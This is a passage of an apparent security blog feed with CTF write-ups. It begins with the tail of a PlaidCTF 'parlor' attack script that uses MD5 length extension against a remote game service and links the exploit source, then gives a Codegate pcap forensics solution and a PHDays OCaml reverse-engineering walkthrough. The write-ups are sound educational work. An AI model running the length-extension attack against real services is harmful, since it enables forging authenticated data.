</span><span class='line'><span class="k">if</span> <span class="bp">False</span><span class="p">:</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;5&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;the nonce has been &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">nonce</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="o">.</span><span class="n">readline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">nonce</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;L&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">log</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&#39;./search&#39;</span><span class="p">,</span> <span class="n">remain1_str</span><span class="p">,</span> <span class="n">remain2_str</span><span class="p">]),</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">prefix</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;./search&#39;</span><span class="p">,</span> <span class="n">remain1_str</span><span class="p">,</span> <span class="n">remain2_str</span><span class="p">])</span>
</span><span class='line'><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span> <span class="o">==</span> <span class="mi">7</span>
</span><span class='line'>
</span><span class='line'><span class="n">first_md5</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span> <span class="o">+</span> <span class="n">remain1_str</span><span class="p">[</span><span class="mi">7</span><span class="p">:]</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;between 1 and 100):&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">log</span><span class="p">(</span><span class="s">&#39; &#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">&#39;./even&#39;</span><span class="p">,</span> <span class="n">first_md5</span><span class="p">]),</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">candi</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s">&#39;./even&#39;</span><span class="p">,</span> <span class="n">first_md5</span><span class="p">])</span>
</span><span class='line'><span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">candi</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">():</span>
</span><span class='line'>    <span class="n">ary</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">&#39;, &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">ary</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
</span><span class='line'>    <span class="k">if</span> <span class="n">c</span> <span class="o">==</span> <span class="s">&#39;b&#39;</span><span class="p">:</span> <span class="k">continue</span>
</span><span class='line'>    <span class="n">ext</span> <span class="o">=</span> <span class="n">md5_ext</span><span class="p">(</span><span class="s">&#39;k&#39;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&#39;a</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">,</span> <span class="n">c</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">log</span><span class="p">(</span><span class="s">&#39;hash expectation: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">ary</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s">&#39;red&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39; and &#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">balance</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;):&#39;</span><span class="p">)[:</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="n">balance</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;6) quit&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;nonce for this round&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">io</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ext</span><span class="p">[</span><span class="mi">16</span><span class="p">:])</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">rs</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">read_until</span><span class="p">(</span><span class="s">&#39;====&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Too bad&#39;</span> <span class="ow">in</span> <span class="n">rs</span><span class="p">:</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>    <span class="k">elif</span> <span class="s">&#39;key&#39;</span> <span class="ow">in</span> <span class="n">rs</span><span class="p">:</span>
</span><span class='line'>        <span class="k">break</span>
</span><span class='line'>
</span><span class='line'><span class="n">io</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>Here is the command line output recorded by asciinema <a href="https://asciinema.org/a/8888">commandline output record</a></p>

<script type="text/javascript" src="https://asciinema.org/a/8888.js" id="asciicast-8888" async></script>


<p>Download source code here</p>

<ul>
<li><a href="/downloads/code/plaidctf-2014-parlor-writeup/parlor.py">attack script parlor.py</a></li>
<li><a href="/downloads/code/plaidctf-2014-parlor-writeup/search.cpp">search.cpp</a></li>
<li><a href="/downloads/code/plaidctf-2014-parlor-writeup/even.cpp">even.cpp</a></li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Codegate CTF 2014 Quals - Weirdshark Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/02/25/codegate-2014-weirdshark-writeup/"/>
    <updated>2014-02-25T01:51:55+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/02/25/codegate-2014-weirdshark-writeup</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>A pcap file is given here for analysis. check type using <code>file</code></p>

<pre><code># file weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7
weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7: pcap-ng capture file - version 1.0
</code></pre>

<p>Open the file using wireshark, but no luck, wireshark reports malformed file format and refuse to open it.</p>

<p>So we need to extract the packets inside manually.</p>

<!-- more -->


<p>Soon I got the file format document <a href="https://www.winpcap.org/ntar/draft/PCAP-DumpFileFormat.html">here</a>, the file format is really simple, it&rsquo;s organized in blocks, and according to my comprehension, each block contains a single network frame packet.</p>

<p>According to <code>general block structure</code> section in the pcap document, we can easily get the block type, length, and content.</p>

<p>And as for the packet, there are several levels of network protocol headers, a brief hex view shows that the network traffic are HTTP requests and responses, so the protocol stack should be IP + TCP + HTTP</p>

<pre><code>| 6 + 6 bytes MAC addr + 2 bytes (ethertype 08 00) | 20 bytes IP header | 20 bytes TCP header | HTTP Header + HTTP Body |
</code></pre>

<p>the hard thing here to do manually pcap parse is to assemble TCP packets into byte stream, which require a good understanding of TCP control sequence. But we can assume that the network condition is good, no packet loss or retranssmission happens, just assemble them one by one and see what happens.</p>

<p>use the following python code to extract all http content</p>

<p>```python
import os, sys, struct</p>

<p>f = open(&lsquo;weird_shark.pcap_f5f1e42dd398f18c43af89ba972b3ee7&rsquo;).read()
total = len(f)</p>

<h1>skip the first two blocks, which seems broken, 0x80 and 0x9c are the block sizes respectively</h1>

<p>index = 0x80 + 0x9c</p>

<p>w = open(&lsquo;http-content.bin&rsquo;, &lsquo;w&rsquo;)</p>

<p>while index &lt; total:</p>

<pre><code>block_type = f[index:index+4].encode('hex')
block_size = struct.unpack('&lt;I', f[index+4:index+8])[0]
captured_len = struct.unpack('&lt;I', f[index+20:index+24])[0]
packet_len = struct.unpack('&lt;I', f[index+24:index+28])[0]
print index, block_size, packet_len, captured_len, block_type
w.write(f[index+28+54:index+28+packet_len])
w.flush()
index += block_size
</code></pre>

<p>w.close()
```</p>

<p>The result seems very promising,  just concat the packet contents one by one really works! which indicates the network condition is really good. There are several http requests inside</p>

<pre><code>GET / HTTP/1.1
GET /favicon.ico HTTP/1.1
GET /mario.png HTTP/1.1
GET /favicon.ico HTTP/1.1
GET /obama.bmp HTTP/1.1
GET /codegate.jpg HTTP/1.1
GET /multiple.pdf HTTP/1.1
GET /grayhash.jpg HTTP/1.1
</code></pre>

<p>And to my surprise, the flag is not in <code>codegate.jpg</code>, but in <code>multiple.pdf</code></p>

<p>FLAG = <code>FORENSICS_WITH_HAXORS</code></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[PHDays CTF IV Quals 2014 - Turututu Writeup]]></title>
    <link href="http://blog.ztrix.me/blog/2014/01/29/phdays-quals-2014-turututu/"/>
    <updated>2014-01-29T11:13:35+08:00</updated>
    <id>http://blog.ztrix.me/blog/2014/01/29/phdays-quals-2014-turututu</id>
    <content type="html"><![CDATA[<p>by Wenlei Zhu (zTrix@blue-lotus)</p>

<p>turututu is an ELF 64-bit executable, after some investigation, it&rsquo;s easy to find out that the task.exe is a native binary generated using <code>ocamlopt</code>.</p>

<p>I know little about <a href="http://en.wikipedia.org/wiki/OCaml">ocaml</a>, so at first I searched a lot trying to get some bytecode or decompiler stuff, or some dedicated debugger for <a href="http://en.wikipedia.org/wiki/OCaml">ocaml</a>, but none of these tools could be found.</p>

<p>So it&rsquo;s time to dive into assembly.</p>

<!-- more -->


<p>From the string constant <code>Sorry, waybe next time...</code>(typo here, LOL!) printed by task.exe, we xref to <code>0x402bf0</code>, and at <code>0x402dda</code>, it seems that some check function is called and then print <code>Gratz!</code> or <code>Sorry, waybe next time...</code>(LOL again!) according to its return value.</p>

<p>Deeper diving reaveals that the check function will invoke a list of functions to check the input value, and whenever something went wrong, the return value would be fail.</p>

<ul>
<li>The first one is at <code>0x4024a0</code>, which is a simple function who parse the arg to a ocaml list of chars.</li>
<li>The second one is at <code>0x402520</code>, which is the check length function. From here we know the list size should be 16.</li>
<li>The third one is at <code>0x402790</code>, ah, a magic string <code>The sky above the port was the color of...</code> can be seen here, it seems that some permutation operations are done here, and will always give positive return value, so just leave it here for later analysis.</li>
<li>The fourth one is at <code>0x402870</code>, this is the real check, and will return false if the check fails.</li>
<li>And there are function 5, 6, 7, will check after function 4. Leave them for later analysis.</li>
</ul>


<p>Ok now we know that we should run the program with a string as argument of 16 bytes, and if the string match something, the <code>task.exe</code> will print happy result. And it&rsquo;s very likely that the input argument should be the flag.</p>

<p>There are a lot of ocaml library functions out there without any signature, making it very hard to read assembly. So I compiled a <code>helloworld</code> program using <code>ocamlopt -g hw.ml</code>, and by comparing the hex code, I can identify a lot of important ocaml functions like <code>camlList__map</code>, <code>camlList_c_call</code>, <code>camlList__combine</code>, <code>caml_equal</code>.</p>

<p>But it&rsquo;s still very hard to figure out the actual behavior under the assembly code. Now it&rsquo;s time for the <a href="http://github.com/longld/peda">peda</a> weapon.</p>

<p>I wrote a small piece of code in <a href="http://github.com/longld/peda">peda</a> to print ocaml list values</p>

<p>```python
def ocamlist(self, *arg):</p>

<pre><code>"""
dump ocaml list
Usage:
    ocamlist register
    ocamlist address
"""
(address,) = normalize_argv(arg, 1)
if address is None:
    self._missing_argument()
if str(address).startswith("r"):
    address = peda.getreg(arg[0])
else:
    address = to_int(arg[0])
result = []
for i in range(100):
    result.append(peda.read_int(address, 8))
    address = peda.read_int(address+8, 8)
    if address &lt; 0x1000:
        break
msg('ocamllist: (%d) %s' % (len(result), repr(result)))
return
</code></pre>

<p>```</p>

<p>Now fire! gdbinit here</p>

<pre><code>file task.exe
b *0x402baa
r 1234567890ABCDEF
</code></pre>

<p><code>continue</code> at gdb to skip the first function. Then <code>ocamlist $rax</code></p>

<pre><code>Breakpoint 1, 0x0000000000402baa in ?? ()
gdb-peda$ ocamlist $rax
ocamllist: (16) [99, 101, 103, 105, 107, 109, 111, 113, 115, 97, 131, 133, 135, 137, 139, 141]
</code></pre>

<p>Oops, why should ocaml put <code>2x+1</code> value in the list. Never mind.</p>

<p><code>continue</code> two times to skip the length check. Then <code>ocamlist $rax</code></p>

<pre><code>Breakpoint 1, 0x0000000000402baa in ?? ()
gdb-peda$ ocamlist $rax
ocamllist: (16) [101, 135, 115, 111, 97, 141, 139, 99, 137, 133, 113, 103, 109, 107, 105, 131]
</code></pre>

<p>Now we have the permutation table. :)</p>

<p><code>ni</code> into <code>0x402870</code>, and <code>ni</code> to <code>0x402888</code>, <code>ocamlist $rax</code></p>

<pre><code>gdb-peda$ ocamlist $rax
ocamllist: (8) [137, 133, 113, 103, 109, 107, 105, 131]
</code></pre>

<p>so <code>0x4025e0</code> cut the list from index 8, return the second part. <code>ni</code> to <code>0x40289d</code></p>

<pre><code>0x000000000040289d in ?? ()
gdb-peda$ ocamlist $rax
ocamllist: (8) [101, 135, 115, 111, 97, 141, 139, 99]
</code></pre>

<p>we got the first half. Then at <code>0x4028a1</code>, we can identify the function called to be <code>camlList__combine</code> by comparing hex code, we can also know the function <code>camlList__map</code> called at <code>0x4028b0</code>, <code>caml_equal</code> loaded at <code>0x4028bf</code>, and the constant list at <code>0x4028b5</code> is</p>

<pre><code>gdb-peda$ ocamlist 0x621c20
ocamllist: (8) [591, 599, 687, 663, 475, 687, 687, 609]
</code></pre>

<p>So, the logic here become evident. if written in python, it should be sth like this</p>

<p><code>python
combined = zip(lst[:8], lst[8:])
maped = map(f, combined)
assert maped == [591, 599, 687, 663, 475, 687, 687, 609]
</code></p>

<p>Now we need to know the function f, <code>si</code> into <code>camlList__map</code> and we can find out f at <code>0x402360</code></p>

<pre><code>=&gt; 0x402360:    sar    rbx,1
   0x402363:    lea    rax,[rax+rbx*4]
   0x402367:    ret
</code></pre>

<p>so the python code can be completed</p>

<p><code>python
combined = zip(lst[:8], lst[8:])
maped = map(lambda x: (x[1]&gt;&gt;1)*4+x[0], combined)
assert maped == [591, 599, 687, 663, 475, 687, 687, 609]
</code></p>

<p>the next 3 check functions are at <code>0x4029e0</code>, <code>0x402a80</code>, <code>0x402b20</code>, all of them looks like the function we just analysed. It&rsquo;s obvious <code>0x402b20</code> is the simplest. Using the same technique stated above. We can find out this check is actually doing this:</p>

<p><code>python
assert lst[7:] == [145, 195, 233, 229, 221, 137, 243, 229, 233]
</code></p>

<p>WTF? I just cannot believe this. Fine, we do not need to analyze other functions. Now we can get our most wanted flag</p>

<p>```python
rev = [7, 0, 11, 14, 13, 12, 3, 10, 2, 4, 15, 9, 1, 8, 6, 5]</p>

<p>fun7 = [145, 195, 233, 229, 221, 137, 243, 229, 233]
fun4 = [591, 599, 687, 663, 475, 687, 687, 609]
p = []
for i in range(8):</p>

<pre><code>p.append(fun4[i] - (fun7[i+1]&gt;&gt;1)*4)
</code></pre>

<p>lst = p + fun7[1:]
lst = [(lst[rev[i]]-1)/2 for i in range(len(lst))]
print &lsquo;&rsquo;.join(map(chr, lst))
```</p>

<p>The flag is <code>HenryDorsettCase</code></p>
]]></content>
  </entry>
  
</feed>
